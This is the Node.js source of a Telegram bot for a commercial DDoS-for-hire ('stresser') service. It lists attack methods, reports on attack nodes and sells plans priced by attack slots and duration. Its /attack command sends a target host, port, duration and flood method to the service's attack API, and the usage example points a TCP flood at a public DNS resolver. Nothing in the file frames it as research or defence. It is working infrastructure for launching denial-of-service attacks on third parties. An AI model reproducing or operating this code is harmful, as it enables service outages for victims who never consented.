const axios = require('axios');
const fs = require('fs');
const path = require('path');
const DataManager = require('./managers/DataManager');
const AuthManager = require('./managers/AuthManager');
const AttackManager = require('./managers/AttackManager');

const BASE_DIR = path.join(__dirname, '..');
const DATABASE_DIR = path.join(BASE_DIR, 'database');
const LOGS_DIR = path.join(BASE_DIR, 'logs');
const DEBUG_LOG_PATH = path.join(LOGS_DIR, 'bot_debug.log');
const SETTINGS_PATH = path.join(DATABASE_DIR, 'settings.json');
const USERS_PATH = path.join(DATABASE_DIR, 'users.json');
const SERVERS_PATH = path.join(DATABASE_DIR, 'servers.json');
const METHODS_PATH = path.join(DATABASE_DIR, 'methods.json');
const LOGS_PATH = path.join(DATABASE_DIR, 'logs.json');
const ACTIVITY_LOGS_PATH = path.join(DATABASE_DIR, 'activity_logs.json');

// Ensure logs directory exists
if (!fs.existsSync(LOGS_DIR)) {
    fs.mkdirSync(LOGS_DIR, { recursive: true });
}

// HTML Escaping
function esc(str) {
    if (!str) return '';
    return str.toString()
        .replace(/&/g, '&amp;')
        .replace(/</g, '&lt;')
        .replace(/>/g, '&gt;');
}

// Logging utility
function botLog(prefix, msg, level = 'INFO') {
    const timestamp = new Date().toISOString();
    const logMsg = `[${timestamp}] [${level}] ${prefix}: ${msg}`;

    // Console output
    if (level === 'ERROR') {
        console.error(logMsg);
    } else {
        console.log(logMsg);
    }

    // File output
    try {
        fs.appendFileSync(DEBUG_LOG_PATH, logMsg + '\n');
    } catch (err) {
        console.error('Failed to write debug log:', err.message);
    }
}

function botLogError(prefix, msg, error = '') {
    const errorMsg = error ? `${msg} | ${error}` : msg;
    botLog(prefix, errorMsg, 'ERROR');
}

const API_BASE_URL = process.env.API_BASE_URL || 'http://localhost:8880';
const WEB_DASHBOARD = process.env.WEB_DASHBOARD || `https://stress.vpsgen.com/dashboard`;

const ICONS = {
    'success': '✅', 'error': '❌', 'info': 'ℹ️', 'warning': '⚠️',
    'rocket': '🚀', 'user': '👤', 'shield': '🛡️', 'chart': '📊',
    'lock': '🔐', 'network': '🌐', 'bolt': '⚡', 'target': '🎯',
    'fire': '🔥', 'clock': '🕒', 'settings': '⚙️', 'home': '🏠',
    'back': '⬅️', 'next': '➡️', 'list': '📜', 'globe': '🌐',
    'crown': '👑', 'star': '⭐', 'gem': '💎', 'money': '💰',
    'ban': '🚫', 'check': '✔️', 'gear': '⚙️', 'trash': '🗑️',
    'plus': '➕', 'minus': '➖', 'link': '🔗', 'alert': '🔔',
    'diamond': '🔹', 'terminal': '📟', 'status': '📡'
};

function load_json(p) {
    try { return JSON.parse(fs.readFileSync(p, 'utf8')); } catch (e) { return {} }
}

function save_json(p, data) {
    try { fs.writeFileSync(p, JSON.stringify(data, null, 2)); return true } catch (e) { console.error('save_json', e.message); return false }
}

async function get_api_user(telegram_id) {
    try {
        const res = await axios.get(`${API_BASE_URL}/api/bot/user/${telegram_id}`, { timeout: 5000 });
        if (res.status === 200 && res.data && res.data.success) {
            return res.data.user || null;
        }
        return null;
    } catch (e) {
        botLogError('get_api_user', `Failed for ID ${telegram_id}`, e.message);
        // Try fallback: get user from local database
        try {
            const users = load_json(USERS_PATH) || [];
            const localUser = users.find(u => String(u.telegramId) === String(telegram_id));
            if (localUser) {
                botLog('get_api_user', `Found user ${telegram_id} in local database (fallback)`);
                return localUser;
            }
        } catch (err) {
            botLogError('get_api_user', 'Fallback lookup failed', err.message);
        }
    }
    return null;
}

async function is_admin(user_id) {
    try {
        const settings = load_json(SETTINGS_PATH);
        const allowed = settings.allowedTelegramIds || [];
        // Check if user_id is in allowed list (handle both string and number)
        const userIdStr = String(user_id);
        const isAllowed = allowed.some(id => String(id) === userIdStr);
        if (!isAllowed) {
            botLog('is_admin', `User ${user_id} not in allowed list`);
            return false;
        }

        const api_user = await get_api_user(user_id);
        if (!api_user) {
            botLog('is_admin', `User ${user_id} in allowed list but API not responding, granting admin access`);
            return true; // Still admin if in allowed list, even if API fails
        }
        const plan = (api_user.plan || '').toString().toLowerCase();
        const result = plan === 'admin' || isAllowed;
        botLog('is_admin', `User ${user_id} admin=${result} (plan=${plan})`);
        return result;
    } catch (e) {
        botLogError('is_admin', `Check failed for ${user_id}`, e.message);
        return false;
    }
}

class UIKit {
    static border(width = 25) {
        return `▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬▬`;
    }

    static header(title) {
        return `<b>${title}</b>\n${this.border()}\n`;
    }

    static methods_list(methods) {
        if (!methods || Object.keys(methods).length === 0) return `${ICONS.error} No methods available`;
        let text = this.header(`${ICONS.list} ATTACK VECTORS`) + '\n';
        for (const cat in methods) {
            text += `<b>${ICONS.diamond} ${esc(cat.toUpperCase())}</b>\n`;
            const mlist = methods[cat];
            if (typeof mlist === 'object') {
                for (const n in mlist) {
                    const cfg = mlist[n];
                    const icon = cfg.status === 'online' ? '✅' : '❌';
                    text += `${icon} ${esc(n)}\n`;
                }
            }
            text += '\n';
        }
        return text;
    }

    static servers_status(servers) {
        if (!servers || servers.length === 0) return `${ICONS.error} No nodes reachable`;
        let text = this.header(`${ICONS.network} GRID NETWORK`) + '\n';
        let total = 0; let online = 0;
        servers.forEach((s, idx) => {
            const status = s.status === 'online' ? '✅' : '❌';
            const ongoing = s.ongoing || 0;
            const loadIcon = ongoing > 5 ? '🔥' : '📡';
            text += `${status} <b>Node-${(idx + 1).toString().padStart(2, '0')}</b> ${loadIcon} [${ongoing} slots]\n`;
            total += ongoing; if (s.status === 'online') online++;
        });
        text += `\n${this.border()}\n<b>Health:</b> ${online}/${servers.length} | <b>Active:</b> ${total}`;
        return text;
    }

    static user_profile(u, planConf) {
        if (!u) return `${ICONS.error} Authentication required`;
        const isActive = u.active !== false;
        const status = isActive ? '🟢' : '🔴';
        const pc = planConf || {};
        const apiTag = pc.api_access ? '✅' : '❌';
        const cncTag = pc.cnc_access ? '✅' : '❌';
        const botTag = pc.tele_bot !== false ? '✅' : '❌';
        return this.header(`${ICONS.user} OPERATOR PROFILE`) + '\n' +
            `👤 <b>Account:</b> ${esc(u.username) || 'unknown'}\n` +
            `💎 <b>Tier:</b> ${esc(u.plan || 'NONE').toUpperCase()}\n` +
            `📡 <b>Status:</b> ${status} ${isActive ? 'VALIDATED' : 'REVOKED'}\n\n` +
            `<b>${ICONS.star} CAPACITY</b>\n${this.border()}\n` +
            `• Concurrent: ${u.concurrents || 0}\n` +
            `• Max Time: ${u.maxTime || 0}s\n` +
            `• Active Hits: ${u.slotsUsed || 0}/${u.slots || 0}\n\n` +
            `<b>${ICONS.lock} ACCESS LEVEL</b>\n${this.border()}\n` +
            `${apiTag} API Access\n` +
            `${cncTag} CNC / C2 Terminal\n` +
            `${botTag} Telegram Bot\n\n` +
            `<b>${ICONS.clock} EXPIRATION</b>\n${this.border()}\n` +
            `${esc(u.expiration) || 'Lifetime'}\n\n` +
            `<i>Upgrade plan to unlock more features</i>`;
    }

    static plans_list(plans) {
        if (!plans || Object.keys(plans).length === 0) return `${ICONS.error} No intelligence plans`;
        let text = this.header(`${ICONS.gem} SUBSCRIPTION TIERS`) + '\n';
        for (const planName in plans) {
            if (planName === 'Admin') continue;
            const plan = plans[planName];
            text += `<b>${ICONS.money} ${esc(planName).toUpperCase()}</b>\n`;
            if (typeof plan === 'object') {
                const price_vnd = plan.price || 'N/A';
                const price_usd = plan.price_usd || '';
                const price_display = (price_usd && price_usd !== price_vnd) ? `${esc(price_vnd)} (${esc(price_usd)})` : esc(price_vnd);

                text += `💰 Price: ${price_display} ${esc(plan.period || '')}\n`;
                text += `⚡ Slots: ${plan.slots || 0} | Concurrents: ${plan.concurrents || 0}\n`;
                text += `🕒 Max Time: ${plan.maxTime || 60}s\n`;
                // Access badges
                const apiTag = plan.api_access ? '✅' : '❌';
                const cncTag = plan.cnc_access ? '✅' : '❌';
                const botTag = plan.tele_bot ? '✅' : '❌';
                text += `${apiTag} API  ${cncTag} CNC  ${botTag} Bot\n`;
                // Features
                if (plan.features && plan.features.length > 0) {
                    plan.features.forEach(f => text += `  • ${esc(f)}\n`);
                }
            }
            text += '\n';
        }
        text += `<i>Contact admin on Telegram to purchase</i>`;
        return text;
    }
}

// Maintenance utilities
function autoClearLogs() {
    try {
        if (!fs.existsSync(LOGS_DIR)) return;
        const files = fs.readdirSync(LOGS_DIR);
        const now = Date.now();
        const MAX_AGE = 24 * 60 * 60 * 1000; // 24 hours

        botLog('Maintenance', `Checking logs for automatic cleanup...`);
        let cleared = 0;
        files.forEach(file => {
            const filePath = path.join(LOGS_DIR, file);
            // Skip the current debug log file to avoid lock issues
            if (filePath === DEBUG_LOG_PATH) return;

            try {
                const stats = fs.statSync(filePath);
                if (now - stats.mtimeMs > MAX_AGE) {
                    fs.unlinkSync(filePath);
                    cleared++;
                }
            } catch (err) {
                botLogError('Maintenance', `Failed to delete ${file}`, err.message);
            }
        });

        if (cleared > 0) {
            botLog('Maintenance', `✅ Cleared ${cleared} old log file(s)`);
        } else {
            botLog('Maintenance', `No old logs to clear`);
        }
    } catch (err) {
        botLogError('Maintenance', `Auto-clear failed`, err.message);
    }
}

// Telegram API helpers
async function tg(method, token, body) {
    try { const res = await axios.post(`https://api.telegram.org/bot${token}/${method}`, body, { timeout: 8000 }); return res.data; } catch (e) { console.error('tg:', method, e.message); return null }
}

function makeKeyboard(rows) {
    return { reply_markup: { inline_keyboard: rows } };
}

async function deleteMessage(token, chat_id, message_id) {
    try { await axios.post(`https://api.telegram.org/bot${token}/deleteMessage`, { chat_id, message_id }); return true; } catch (e) { return false; }
}

async function answerCallback(token, callback_query_id, text, show_alert = false) {
    try { await axios.post(`https://api.telegram.org/bot${token}/answerCallbackQuery`, { callback_query_id, text, show_alert }); } catch (e) { console.error('answerCallback', e.message) }
}

async function editMessageText(token, chat_id, message_id, text, extra = {}) {
    try {
        const res = await axios.post(`https://api.telegram.org/bot${token}/editMessageText`, {
            chat_id,
            message_id,
            text: text,
            parse_mode: 'HTML',
            ...extra
        });
        return res.data;
    } catch (e) {
        botLogError('editMessageText', `Failed to edit ${message_id}`, e.response?.data ? JSON.stringify(e.response.data) : e.message);
        return null;
    }
}

async function sendMessage(token, chat_id, text, extra = {}) {
    try {
        botLog('sendMessage', `Sending to chat_id=${chat_id}, length=${text.length}`);
        const res = await axios.post(`https://api.telegram.org/bot${token}/sendMessage`, {
            chat_id,
            text: text,
            parse_mode: 'HTML',
            ...extra
        });
        botLog('sendMessage', `✅ Sent successfully to ${chat_id}`);
        return res.data;
    } catch (e) {
        botLogError('sendMessage', `Failed to send to ${chat_id}`, e.response?.data ? JSON.stringify(e.response.data) : e.message);
        return null;
    }
}

let activeHits = [];

// Core handlers (message & callback)
async function handleStart(chat_id, from, token, update) {
    try {
        botLog('handleStart', `User ${from.id} (${from.username}) triggered /start`);

        const api_user = await get_api_user(from.id);
        botLog('handleStart', `API user result: ${api_user ? `✅ ${api_user.username}` : '❌ Unauthorized access'}`);

        if (!api_user || !api_user.username) {
            const text = UIKit.header(`${ICONS.lock} ACCESS DENIED`) + '\n' +
                `${ICONS.user} <b>Session:</b> ${esc(from.first_name || from.username || 'unknown')}\n` +
                `${ICONS.shield} <b>Identity:</b> ${esc(from.id)}\n\n` +
                `${ICONS.error} <b>LINKAGE REQUIRED</b>\n\n` +
                `Link your Telegram ID on the Web Dashboard to unlock access.\n\n` +
                `<i>All unauthorized attempts are logged.</i>`;
            const kb = makeKeyboard([[{ text: `${ICONS.globe} Dashboard`, url: WEB_DASHBOARD }]]);
            botLog('handleStart', `Sending access denied message`);
            return sendMessage(token, chat_id, text, kb);
        }

        const admin = await is_admin(from.id);
        botLog('handleStart', `Admin status: ${admin ? '✅ ADMIN' : '❌ User'}`);

        const admin_badge = admin ? `${ICONS.crown} ADMIN` : api_user.plan || 'FREE';
        const userCommands = `User Commands:\n` +
            `/methods - List available attack vectors\n` +
            `/plans - View pricing plans\n` +
            `/status - Show cluster/server status\n` +
            `/id - Show your Telegram ID\n` +
            `<code>${esc('/attack')} &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;method&gt; [nodes]</code> - Launch attack\n` +
            `/profile - View your account profile\n`;
        const adminCommands = `Admin Commands (admin only):\n` +
            `/users - List users\n` +
            `<code>/ban &lt;username&gt;</code> - Ban a user\n` +
            `<code>/unban &lt;username&gt;</code> - Unban a user\n` +
            `<code>/broadcast &lt;message&gt;</code> - Broadcast to allowed IDs\n` +
            `/admin_status - System stats\n` +
            `/admin_logs - Recent logs\n` +
            `/admin_reset - Clear logs\n` +
            `<code>/admin_edit &lt;user&gt; &lt;plan&gt;</code> - Edit user plan\n`;

        const text = UIKit.header(`${ICONS.bolt} COMMAND CENTER`) + '\n' +
            `${ICONS.user} <b>Operator:</b> ${esc(api_user.username) || 'unregistered'}\n` +
            `${ICONS.shield} <b>Clearance:</b> ${esc(admin_badge)}\n` +
            `${ICONS.success} <b>Encryption:</b> AES-256\n\n` +
            `<b>${ICONS.star} STATS RECAP</b>\n${UIKit.border()}\n` +
            `• Active Hits: ${api_user.slotsUsed || 0}/${api_user.slots || 0}\n` +
            `• Burst Time: ${api_user.maxTime || 0}s\n` +
            `• Node Access: ${api_user.concurrents || 0}\n\n` +
            `<b>AVAILABLE COMMANDS</b>\n${UIKit.border()}\n` +
            `${userCommands}` +
            (admin ? `${adminCommands}` : `<i>Additional protocols restricted.</i>`);

        const keyboard = [
            [{ text: `${ICONS.rocket} Attack`, callback_data: 'attack' }, { text: `${ICONS.chart} Status`, callback_data: 'status' }],
            [{ text: `${ICONS.list} Methods`, callback_data: 'methods' }, { text: `${ICONS.user} Profile`, callback_data: 'profile' }],
            [{ text: `${ICONS.info} Help`, callback_data: 'help' }]
        ];
        if (admin) keyboard.push([{ text: `${ICONS.crown} Admin Panel`, callback_data: 'admin_main' }, { text: `${ICONS.settings} Settings`, callback_data: 'admin_settings' }]);
        const kb = makeKeyboard(keyboard);
        botLog('handleStart', `Sending start menu with ${keyboard.length} button rows`);
        return sendMessage(token, chat_id, text, kb);
    } catch (err) {
        botLogError('handleStart', 'Handler error', err.message);
        return sendMessage(token, chat_id, `${ICONS.error} Error: ${esc(err.message)}`);
    }
}

async function handleCallback(update, token) {
    const cq = update.callback_query;
    if (!cq) return;
    const data = cq.data;
    const from = cq.from;
    const chat = (cq.message && cq.message.chat) || { id: from.id };
    await answerCallback(token, cq.id);

    // require linked user for most actions
    const api_user = await get_api_user(from.id);
    if (!api_user && data !== 'home') return editMessageText(token, chat.id, cq.message.message_id, `${ICONS.error} Authentication required.`);

    if (data === 'home') return handleStart(chat.id, from, token, update);
    if (data === 'help') {
        const userCmds = `/methods - List attack vectors\n/plans - View pricing plans\n/status - Cluster status\n/id - Your ID\n<code>/attack &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;method&gt; [nodes]</code> - Launch\n/profile - View profile`;
        const adminCmds = `/users - List users\n<code>/ban &lt;user&gt;</code>\n<code>/unban &lt;user&gt;</code>\n<code>/broadcast &lt;msg&gt;</code>\n/admin_status\n/admin_logs\n/admin_reset\n<code>/admin_edit &lt;user&gt; &lt;plan&gt;</code>`;
        const text = `<b>${ICONS.info} HOW TO USE ${ICONS.info}</b>\n${UIKit.border()}\n\n<b>User Commands</b>\n${userCmds}\n\n` + (await is_admin(cq.from.id) ? `<b>Admin Commands</b>\n${adminCmds}` : `<i>Admin commands hidden. Contact admin.</i>`);
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([[{ text: `${ICONS.back} Back`, callback_data: 'home' }]]));
    }

    if (data === 'methods') {
        const methods = load_json(METHODS_PATH);
        const text = UIKit.methods_list(methods);
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.rocket} Attack`, callback_data: 'attack' }],
            [{ text: `${ICONS.back} Back`, callback_data: 'home' }]
        ]));
    }

    if (data === 'status') {
        const servers = load_json(SERVERS_PATH) || [];
        const text = UIKit.servers_status(servers);
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.next} Refresh`, callback_data: 'status' }],
            [{ text: `${ICONS.back} Back`, callback_data: 'home' }]
        ]));
    }

    if (data === 'profile') {
        const profPlans = load_json(path.join(DATABASE_DIR, 'plans.json')) || {};
        const profConf = profPlans[api_user.plan] || profPlans['Free'] || {};
        const text = UIKit.user_profile(api_user, profConf);
        const dashboardBtn = `${ICONS.globe} Dashboard`;
        const dashboardUrl = WEB_DASHBOARD;
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: dashboardBtn, url: dashboardUrl }],
            [{ text: `${ICONS.back} Back`, callback_data: 'home' }]
        ]));
    }

    if (data === 'attack') {
        const text = `<b>${ICONS.rocket} ATTACK MODE ${ICONS.rocket}</b>\n${UIKit.border()}\n\n` +
            `<b>Usage:</b>\n<code>/attack &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;method&gt; [nodes]</code>\n\n` +
            `<b>Example:</b>\n<code>/attack 8.8.8.8 80 60 TCP-FLOOD 2</code>\n\n` +
            `<b>Parameters:</b>\n` +
            `• <b>target:</b> IP or domain\n` +
            `• <b>port:</b> 1-65535\n` +
            `• <b>time:</b> Duration (seconds)\n` +
            `• <b>method:</b> Attack vector\n` +
            `• <b>nodes:</b> (Optional) Concurrent nodes\n\n` +
            `<i>Danh sách methods: /methods</i>`;
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.back} Back`, callback_data: 'home' }]
        ]));
    }

    // Admin actions
    if (data === 'admin_main') {
        if (!await is_admin(from.id)) return answerCallback(token, cq.id, `${ICONS.error} Admin only`, true);
        const text = `<b>${ICONS.crown} ADMIN PANEL ${ICONS.crown}</b>\n${UIKit.border()}\n\n` +
            `<b>Management Tools:</b>\n` +
            `• User Management\n` +
            `• System Monitoring\n` +
            `• Attack Logs\n` +
            `• Broadcast Messages\n\n` +
            `<b>Commands:</b>\n` +
            `/users - User list\n` +
            `/admin_status - Stats\n` +
            `/admin_logs - Logs`;
        const kb = makeKeyboard([
            [{ text: `${ICONS.user} Users`, callback_data: 'admin_users' }, { text: `${ICONS.chart} Stats`, callback_data: 'admin_stats' }],
            [{ text: `${ICONS.alert} Logs`, callback_data: 'admin_logs' }, { text: `${ICONS.settings} Settings`, callback_data: 'admin_settings' }],
            [{ text: `${ICONS.back} Back`, callback_data: 'home' }]
        ]);
        return editMessageText(token, chat.id, cq.message.message_id, text, kb);
    }

    if (data === 'admin_users') {
        if (!await is_admin(from.id)) return answerCallback(token, cq.id, `${ICONS.error} Admin only`, true);
        const users = load_json(USERS_PATH) || [];
        let text = UIKit.header(`${ICONS.user} USERS MANAGEMENT`) + '\n';
        if (users.length === 0) {
            text += `<i>No users registered in database</i>`;
        } else {
            users.slice(0, 50).forEach(u => {
                const status = u.active !== false ? ICONS.success : ICONS.ban;
                const plan = (u.plan || 'FREE').padEnd(6);
                text += `${status} <code>${(u.username || 'N/A').padEnd(15)}</code> [${plan}]\n`;
            });
            if (users.length > 50) text += `\n... and ${users.length - 50} more`;
        }
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.back} Back`, callback_data: 'admin_main' }]
        ]));
    }

    if (data === 'admin_stats') {
        if (!await is_admin(from.id)) return answerCallback(token, cq.id, `${ICONS.error} Admin only`, true);
        const servers = load_json(SERVERS_PATH) || [];
        const users = load_json(USERS_PATH) || [];
        const logs = load_json(ACTIVITY_LOGS_PATH) || [];
        const online = servers.filter(s => s && s.status === 'online').length;
        const text = UIKit.header(`${ICONS.chart} SYSTEM OVERVIEW`) + '\n' +
            `${ICONS.network} <b>Nodes:</b> ${online}/${servers.length} online\n` +
            `${ICONS.user} <b>Database:</b> ${users.length} users\n` +
            `${ICONS.alert} <b>Audit Logs:</b> ${logs.length} entries\n\n` +
            `${ICONS.clock} <b>UTC Time:</b> ${new Date().toISOString().replace('T', ' ').split('.')[0]}`;
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.back} Back`, callback_data: 'admin_main' }]
        ]));
    }

    if (data === 'admin_logs') {
        if (!await is_admin(from.id)) return answerCallback(token, cq.id, `${ICONS.error} Admin only`, true);
        const logs = load_json(ACTIVITY_LOGS_PATH) || [];
        let text = UIKit.header(`${ICONS.alert} SECURITY AUDIT`) + '\n';
        if (logs.length === 0) {
            text += `<i>No activity logs found</i>`;
        } else {
            logs.slice(-15).forEach(l => {
                text += `<code>${(l.timestamp || '').substring(11, 19)}</code> <b>${l.action || 'unknown'}</b> by <code>${l.username || 'N/A'}</code>\n`;
            });
        }
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.back} Back`, callback_data: 'admin_main' }]
        ]));
    }

    if (data === 'admin_settings') {
        if (!await is_admin(from.id)) return answerCallback(token, cq.id, `${ICONS.error} Admin only`, true);
        const text = `<b>${ICONS.settings} ADMIN SETTINGS ${ICONS.settings}</b>\n${UIKit.border()}\n\n` +
            `<b>Advanced Commands:</b>\n` +
            `/ban &lt;username&gt; - Ban user\n` +
            `/unban &lt;username&gt; - Unban user\n` +
            `/broadcast &lt;msg&gt; - Broadcast to all\n` +
            `/admin_edit &lt;user&gt; &lt;plan&gt; - Change plan\n` +
            `/admin_reset - Clear logs\n\n` +
            `<b>Security:</b> All admin actions are logged!`;
        return editMessageText(token, chat.id, cq.message.message_id, text, makeKeyboard([
            [{ text: `${ICONS.back} Back`, callback_data: 'admin_main' }]
        ]));
    }

    return answerCallback(token, cq.id, `${ICONS.error} Unknown action`, true);
}

async function handleMessage(msg, token) {
    try {
        const chat_id = msg.chat.id;
        const from = msg.from || {};
        const text = (msg.text || '').trim();
        botLog('handleMessage', `Received from ${from.id} (${from.username}): "${text.substring(0, 50)}"`);

        if (!text) {
            botLog('handleMessage', `Empty message, skipping`);
            return;
        }

        const parts = text.split(/\s+/);
        let firstWord = parts[0].toLowerCase();

        // ONLY process actual commands
        if (!firstWord.startsWith('/')) {
            botLog('handleMessage', `Not a command, ignoring`);
            return;
        }

        // Normalize command: /attack@BotName -> /attack
        let cmd = firstWord.split('@')[0];
        botLog('handleMessage', `Parsed command="${cmd}", original="${firstWord}", parts=${parts.length}`);

        // Dispatching
        if (cmd === '/start' || cmd === '/help') {
            botLog('handleMessage', `Dispatching ${cmd} to handleStart`);
            return handleStart(chat_id, from, token);
        }

        if (cmd === '/id') {
            botLog('handleMessage', `/id command`);
            return sendMessage(token, chat_id, `Your ID: ${esc(from.id)}`);
        }

        if (cmd === '/methods') {
            botLog('handleMessage', `/methods command`);
            const methods = load_json(METHODS_PATH) || {};
            return sendMessage(token, chat_id, UIKit.methods_list(methods));
        }

        if (cmd === '/plans') {
            botLog('handleMessage', `/plans command`);
            const plans = load_json(path.join(DATABASE_DIR, 'plans.json')) || {};
            return sendMessage(token, chat_id, UIKit.plans_list(plans));
        }

        if (cmd === '/status') {
            botLog('handleMessage', `/status command`);
            const servers = load_json(SERVERS_PATH) || [];
            return sendMessage(token, chat_id, UIKit.servers_status(servers));
        }

        if (cmd === '/profile') {
            botLog('handleMessage', `/profile command`);
            const api_user = await get_api_user(from.id);
            if (!api_user) return sendMessage(token, chat_id, `${ICONS.error} Auth required. Link your Telegram ID on dashboard.`);
            const profPlans2 = load_json(path.join(DATABASE_DIR, 'plans.json')) || {};
            const profConf2 = profPlans2[api_user.plan] || profPlans2['Free'] || {};
            return sendMessage(token, chat_id, UIKit.user_profile(api_user, profConf2));
        }

        if (cmd === '/users') {
            botLog('handleMessage', `/users command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            const users = load_json(USERS_PATH) || [];
            let textOut = UIKit.header(`${ICONS.user} OPERATOR LIST`) + '\n';
            users.slice(0, 50).forEach(u => { const status = u.active !== false ? ICONS.success : ICONS.ban; textOut += `${status} <code>${(u.username || '')}</code> - ${u.plan || 'FREE'}\n`; });
            return sendMessage(token, chat_id, textOut);
        }

        if (cmd === '/attack') {
            botLog('handleMessage', `/attack command`);
            const api_user = await get_api_user(from.id);
            if (!api_user || !api_user.username) return sendMessage(token, chat_id, `${ICONS.error} Auth required. Link your Telegram ID on dashboard.\n\nNote: Anonymous admins must post as their own account!`);

            // Check tele_bot access
            const botPlans = load_json(path.join(DATABASE_DIR, 'plans.json')) || {};
            const userBotPlan = botPlans[api_user.plan] || botPlans['Free'] || {};
            if (userBotPlan.tele_bot === false) {
                const nextBotPlan = Object.entries(botPlans).find(([name, p]) => p.tele_bot === true && name.toLowerCase() !== 'admin')?.[0] || 'a paid tier';
                return sendMessage(token, chat_id, `${ICONS.ban} <b>ACCESS DENIED</b>\n\nYour current plan <b>${esc(api_user.plan)}</b> is restricted from Bot infrastructure.\n\n${ICONS.gem} <b>Upgrade to ${esc(nextBotPlan)}</b> or higher to unlock the full G-STRESSER Telegram cluster!`);
            }

            if (parts.length < 5) return sendMessage(token, chat_id, `${ICONS.error} Usage: <code>${esc('/attack')} &lt;target&gt; &lt;port&gt; &lt;time&gt; &lt;method&gt; [nodes]</code>`);
            const target = parts[1], port = parseInt(parts[2]), duration = parseInt(parts[3]), method = parts[4];
            const nodes = parts[5] ? parseInt(parts[5]) : undefined;
            if (!port || !duration) return sendMessage(token, chat_id, `${ICONS.error} Invalid parameters`);
            try {
                await sendMessage(token, chat_id, `${ICONS.info} Launching attack...`);
                const res = await axios.get(`${API_BASE_URL}/api/attack`, {
                    params: {
                        key: api_user.apiKey || '',
                        host: target,
                        port,
                        time: duration,
                        method,
                        conc: nodes,
                        bot_auth: process.env.INTERNAL_BOT_SECRET || 'BOT_SECRET'
                    },
                    timeout: 10000
                });
                const result = res.data || {};
                if (result.success) {
                    const out = UIKit.header(`${ICONS.success} ATTACK DEPLOYED`) + '\n' +
                        `🎯 <b>Target:</b> ${esc(target)}:${esc(port)}\n` +
                        `🔥 <b>Method:</b> ${esc(method)}\n` +
                        `🕒 <b>Time:</b> ${esc(duration)}s\n` +
                        `📡 <b>Nodes:</b> ${nodes || 'Max Plan'}\n` +
                        `🔑 <b>Key:</b> ${esc(result.id || 'N/A')}\n\n` +
                        `<i>Operation is now active across grid nodes.</i>`;

                    const sentMsg = await sendMessage(token, chat_id, out);
                    if (sentMsg && sentMsg.result) {
                        activeHits.push({
                            id: result.id,
                            chatId: chat_id,
                            messageId: sentMsg.result.message_id,
                            endTime: Date.now() + (duration * 1000),
                            target: `${target}:${port}`,
                            method: method,
                            user: from.id
                        });
                    }

                    const logEntry = { timestamp: new Date().toISOString(), telegram_id: from.id, username: from.username || from.first_name, action: 'attack', details: `${target}:${port}` };
                    const activityLogs = load_json(ACTIVITY_LOGS_PATH) || [];
                    activityLogs.push(logEntry);
                    save_json(ACTIVITY_LOGS_PATH, activityLogs);
                    botLog('handleMessage', `Attack deployed for ${target}:${port}`);
                    return; // Message already sent
                }
                return sendMessage(token, chat_id, `${ICONS.error} Failed: ${result.message || 'Error'}`);
            } catch (e) {
                const apiMsg = e.response?.data?.message || e.message;
                botLogError('handleMessage', `/attack error`, apiMsg);
                return sendMessage(token, chat_id, `${ICONS.error} Error: ${esc(apiMsg)}`);
            }
        }

        // admin text commands: /ban, /unban, /broadcast, /admin_status, /admin_logs, /admin_reset
        if (cmd === '/ban' || cmd === '/unban') {
            botLog('handleMessage', `${cmd} command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            if (parts.length < 2) return sendMessage(token, chat_id, `${ICONS.error} Usage: <code>${esc(cmd + ' <username>')}</code>`);
            const username = parts[1];
            const users = load_json(USERS_PATH) || [];
            const idx = users.findIndex(u => u.username === username);
            if (idx === -1) return sendMessage(token, chat_id, `${ICONS.error} User not found`);
            users[idx].active = (cmd === '/unban');
            save_json(USERS_PATH, users);
            return sendMessage(token, chat_id, `${ICONS.success} User ${username} ${(cmd === '/ban') ? 'banned' : 'unbanned'}`);
        }

        if (cmd === '/broadcast') {
            botLog('handleMessage', `/broadcast command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            if (parts.length < 2) return sendMessage(token, chat_id, `${ICONS.error} Usage: <code>${esc('/broadcast <message>')}</code>`);
            const message = parts.slice(1).join(' ');
            const settings = load_json(SETTINGS_PATH) || {};
            const ids = settings.allowedTelegramIds || [];
            const tokenConf = settings.telegramBotToken;
            for (const id of ids) { try { await sendMessage(tokenConf, id, `<b>BROADCAST</b>\n\n${esc(message)}`); } catch (e) { botLogError('handleMessage', `broadcast to ${id}`, e.message); } }
            return sendMessage(token, chat_id, `${ICONS.success} Broadcast sent to ${ids.length} recipients`);
        }

        if (cmd === '/admin_status') {
            botLog('handleMessage', `/admin_status command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            const servers = load_json(SERVERS_PATH) || [];
            const users = load_json(USERS_PATH) || [];
            const online = servers.filter(s => s && s.status === 'online').length;
            const text = UIKit.header(`${ICONS.chart} SYSTEM HEALTH`) + '\n' +
                `${ICONS.network} <b>Nodes:</b> ${online}/${servers.length} online\n` +
                `${ICONS.user} <b>Database:</b> ${users.length}\n` +
                `${ICONS.clock} <b>Clock:</b> ${new Date().toISOString().replace('T', ' ').split('.')[0]}`;
            return sendMessage(token, chat_id, text);
        }

        if (cmd === '/admin_logs') {
            botLog('handleMessage', `/admin_logs command`);
            if (!await is_admin(from.id)) return sendMessage(token, chat_id, `${ICONS.error} Admin only`);
            const logs = load_json(ACTIVITY_LOGS_PATH) || [];
            let text = UIKit.header(`${ICONS.alert} SYSTEM LOGS`) + '\n';
            logs.slice(-20).forEach(l => text += `<code>${l.timestamp}</code> ${l.action} by <code>${l.username}</code>\n`);
